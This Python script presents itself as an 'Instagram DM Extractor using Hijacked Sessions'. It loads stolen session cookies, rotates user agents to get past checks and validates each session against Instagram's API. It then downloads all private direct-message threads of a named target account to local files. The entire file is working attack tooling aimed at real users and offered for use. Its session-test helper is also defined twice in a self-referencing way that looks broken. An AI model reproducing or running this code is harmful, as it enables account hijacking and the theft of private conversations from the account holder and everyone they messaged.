# -*- coding: utf-8 -*-
# pylint: disable=all
# flake8: noqa
# type: ignore
# mypy: ignore-errors
#!/usr/bin/env python3
"""
Advanced Instagram DM Extractor using Hijacked Sessions
Extracts DMs between target account and other users using hijacked sessions.
"""

import os
import json
import requests
import time
from datetime import datetime
import urllib.parse

def load_working_hijacked_session():
    """Load and test hijacked sessions until we find a working one."""
    session_dir = "/workspaces/sugarglitch-realops/hijacked_sessions"
    fallback_files = ["/workspaces/sugarglitch-realops/session.json", "/workspaces/sugarglitch-realops/manual_session.json"]

    # Find all hijacked session files (fresh, rotated, spoofed, etc.)
    session_files = []
    for filename in os.listdir(session_dir):
        if filename.endswith(".json"):
            session_files.append(os.path.join(session_dir, filename))
    # Add fallback session files
    for f in fallback_files:
        if os.path.exists(f):
            session_files.append(f)

    if not session_files:
        print("❌ No hijacked or fallback session files found!")
        return None

    # Sort by modified time (newest first)
    session_files.sort(key = lambda x: os.path.getmtime(x), reverse = True)

    print(f"🔍 Found {len(session_files)} session files (hijacked + fallback). Testing each one...")
    user_agents = [
        'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Mobile/15E148 Safari/604.1',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
    ]

    for session_path in session_files:
        print(f"\n🔍 Testing session: {os.path.basename(session_path)}")
        try:
            with open(session_path, 'r') as f:
                session_data = json.load(f)
            # Try multiple user agents for bypass
            for ua in user_agents:
                print(f"   🌀 Trying user-agent: {ua[:40]}...")
                if test_session_validity(session_data, user_agent = ua):
                    print(f"✅ Found working session: {os.path.basename(session_path)} (UA: {ua[:30]}...)")
                    return session_data
                else:
                    print(f"❌ Session {os.path.basename(session_path)} invalid/expired for UA: {ua[:30]}...")
        except Exception as e:
            print(f"❌ Error loading session {os.path.basename(session_path)}: {e}")
            continue
    print("❌ No valid hijacked or fallback sessions found!")
    return None

def test_session_validity(session_data):
    """Test if a hijacked session is still valid."""
    def _extract_sessionid(data):
        # Fallback for simple sessionid-only files
        if isinstance(data, dict):
            for k in ['sessionid', 'session_id']:
                if k in data:
                    return data[k]
        return None

    try:
        # Create session with cookies
        session = requests.Session()
        if hasattr(test_session_validity, 'user_agent') and test_session_validity.user_agent:
            session.headers['User-Agent'] = test_session_validity.user_agent

        # Handle different session formats
        if 'cookies' in session_data and isinstance(session_data['cookies'], list):
            # Fresh hijacked session format
            for cookie in session_data['cookies']:
                session.cookies.set(
                    cookie['name'],
                    cookie['value'],
                    domain = cookie.get('domain', '.instagram.com')
                )
            # Add headers from fresh hijacked session
            headers = session_data.get('headers', {})
            session.headers.update(headers)
        elif 'cookies' in session_data and isinstance(session_data['cookies'], dict):
            # Spoofed/IP spoofed session format
            for cookie_name, cookie_value in session_data['cookies'].items():
                # URL decode if needed
                if '%' in cookie_value:
                    cookie_value = urllib.parse.unquote(cookie_value)
                session.cookies.set(cookie_name, cookie_value, domain='.instagram.com')
            # Add headers from spoofed session
            if 'successful_headers' in session_data:
                headers = session_data['successful_headers']
                headers = {k: v for k, v in headers.items() if k.lower() != 'cookie'}
                session.headers.update(headers)
        else:
            # Fallback: sessionid only
            sessionid = _extract_sessionid(session_data)
            if sessionid:
                session.cookies.set('sessionid', sessionid, domain='.instagram.com')
            else:
                print("❌ Unknown session format")
                return False
        # Test with a simple API call
        test_url = "https://i.instagram.com/api/v1/accounts/current_user/"
        response = session.get(test_url, timeout = 10)
        if response.status_code == 200:
            user_data = response.json()
            if 'user' in user_data:
                print(f"✅ Session valid - authenticated as: {user_data['user'].get('username', 'unknown')}")
                return True
        print(f"❌ Session test failed - Status: {response.status_code} - {response.text[:100]}")
        return False
    except Exception as e:
        print(f"❌ Session test error: {e}")
        return False
def test_session_validity(session_data, user_agent = None):
    test_session_validity.user_agent = user_agent
    return test_session_validity._impl(session_data)
test_session_validity._impl = test_session_validity.__globals__['test_session_validity']

def create_instagram_session(session_data):
    """Create an authenticated Instagram session using hijacked session data."""
    session = requests.Session()

    # Handle different session formats
    if 'cookies' in session_data and isinstance(session_data['cookies'], list):
        # Fresh hijacked session format
        for cookie in session_data['cookies']:
            session.cookies.set(
                cookie['name'],
                cookie['value'],
                domain = cookie.get('domain', '.instagram.com')
            )

        # Add headers from fresh hijacked session
        headers = session_data.get('headers', {})
        session.headers.update(headers)

    elif 'cookies' in session_data and isinstance(session_data['cookies'], dict):
        # Spoofed/IP spoofed session format
        for cookie_name, cookie_value in session_data['cookies'].items():
            # URL decode if needed
            if '%' in cookie_value:
                cookie_value = urllib.parse.unquote(cookie_value)
            session.cookies.set(cookie_name, cookie_value, domain='.instagram.com')

        # Add headers from spoofed session
        if 'successful_headers' in session_data:
            headers = session_data['successful_headers']
            # Remove Cookie header as we set cookies separately
            headers = {k: v for k, v in headers.items() if k.lower() != 'cookie'}
            session.headers.update(headers)

    return session

def get_user_id_from_username(session, username):
    """Get Instagram user ID from username."""
    try:
        url = f"https://www.instagram.com/api/v1/users/web_profile_info/?username={username}"
        response = session.get(url)

        if response.status_code == 200:
            data = response.json()
            user_id = data['data']['user']['id']
            print(f"✅ Found user ID for {username}: {user_id}")
            return user_id
        else:
            print(f"❌ Failed to get user ID for {username}: {response.status_code}")
            return None

    except Exception as e:
        print(f"❌ Error getting user ID for {username}: {e}")
        return None

def extract_instagram_dms(session, target_user_id):
    """Extract Instagram DMs for the target user using hijacked session."""
    try:
        # Get inbox/threads list
        inbox_url = "https://i.instagram.com/api/v1/direct_v2/inbox/"
        response = session.get(inbox_url)

        if response.status_code != 200:
            print(f"❌ Failed to access inbox: {response.status_code}")
            return []

        inbox_data = response.json()
        threads = inbox_data.get('inbox', {}).get('threads', [])

        print(f"✅ Found {len(threads)} conversation threads")

        all_conversations = []

        for thread in threads:
            thread_id = thread.get('thread_id')
            thread_title = thread.get('thread_title', 'Unknown')
            users = thread.get('users', [])

            # Check if this thread involves our target user
            participant_usernames = [user.get('username', 'unknown') for user in users]
            participant_ids = [user.get('pk', 'unknown') for user in users]

            print(f"📱 Thread: {thread_title} - Participants: {', '.join(participant_usernames)}")

            # Get detailed messages for this thread
            messages_url = f"https://i.instagram.com/api/v1/direct_v2/threads/{thread_id}/"
            msg_response = session.get(messages_url)

            if msg_response.status_code == 200:
                thread_data = msg_response.json()
                messages = thread_data.get('thread', {}).get('items', [])

                conversation = {
                    'thread_id': thread_id,
                    'thread_title': thread_title,
                    'participants': participant_usernames,
                    'participant_ids': participant_ids,
                    'message_count': len(messages),
                    'messages': []
                }

                for msg in messages:
                    message_data = {
                        'timestamp': msg.get('timestamp'),
                        'user_id': msg.get('user_id'),
                        'message_type': msg.get('item_type'),
                        'text': msg.get('text', ''),
                        'created_at': datetime.fromtimestamp(msg.get('timestamp', 0) / 1000000).isoformat() if msg.get('timestamp') else None
                    }

                    # Add sender username
                    sender = next((user for user in users if str(user.get('pk')) == str(msg.get('user_id'))), None)
                    message_data['sender_username'] = sender.get('username', 'unknown') if sender else 'unknown'

                    conversation['messages'].append(message_data)

                all_conversations.append(conversation)
                print(f"✅ Extracted {len(messages)} messages from thread with {', '.join(participant_usernames)}")
            else:
                print(f"❌ Failed to get messages for thread {thread_id}: {msg_response.status_code}")

        return all_conversations

    except Exception as e:
        print(f"❌ Error extracting DMs: {e}")
        return []

def save_extracted_dms(conversations, target_username):
    """Save extracted DM conversations to file."""
    output_dir = "/workspaces/sugarglitch-realops/hijacked_dm_extractions"
    os.makedirs(output_dir, exist_ok = True)

    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"hijacked_dm_extraction_{target_username}_{timestamp}.json"
    filepath = os.path.join(output_dir, filename)

    extraction_data = {
        'extraction_info': {
            'target_username': target_username,
            'extraction_timestamp': timestamp,
            'extraction_date': datetime.now().isoformat(),
            'method': 'hijacked_session_extraction',
            'total_conversations': len(conversations),
            'total_messages': sum(conv['message_count'] for conv in conversations)
        },
        'conversations': conversations
    }

    with open(filepath, 'w', encoding='utf-8') as f:
        json.dump(extraction_data, f, indent = 2, ensure_ascii = False)

    print(f"✅ Saved extracted DMs to: {filepath}")
    return filepath

def main():
    """Main extraction function."""
    print("🚀 Starting Instagram DM extraction using hijacked sessions...")

    # Load a working hijacked session
    session_data = load_working_hijacked_session()
    if not session_data:
        print("❌ No valid hijacked sessions available. Cannot proceed with extraction.")
        return

    # Create authenticated session
    ig_session = create_instagram_session(session_data)

    # Target username (from session info)
    target_username = session_data.get('session_info', {}).get('target_account', 'alx.trading')
    print(f"🎯 Target account: {target_username}")

    # Get target user ID
    target_user_id = get_user_id_from_username(ig_session, target_username)
    if not target_user_id:
        print(f"❌ Could not find user ID for {target_username}")
        return

    # Extract DMs
    print("📱 Extracting Instagram DMs...")
    conversations = extract_instagram_dms(ig_session, target_user_id)

    if conversations:
        # Save results
        filepath = save_extracted_dms(conversations, target_username)

        # Print summary
        print(f"\n🎉 EXTRACTION COMPLETE!")
        print(f"📊 Extracted {len(conversations)} conversations")
        print(f"💬 Total messages: {sum(conv['message_count'] for conv in conversations)}")
        print(f"📁 Saved to: {filepath}")

        # Show conversation summary
        print(f"\n📋 CONVERSATION SUMMARY:")
        for i, conv in enumerate(conversations, 1):
            participants = ', '.join(conv['participants'])
            print(f"{i}. {conv['thread_title']} ({participants}) - {conv['message_count']} messages")
    else:
        print("❌ No conversations extracted.")

if __name__ == "__main__":
    main()
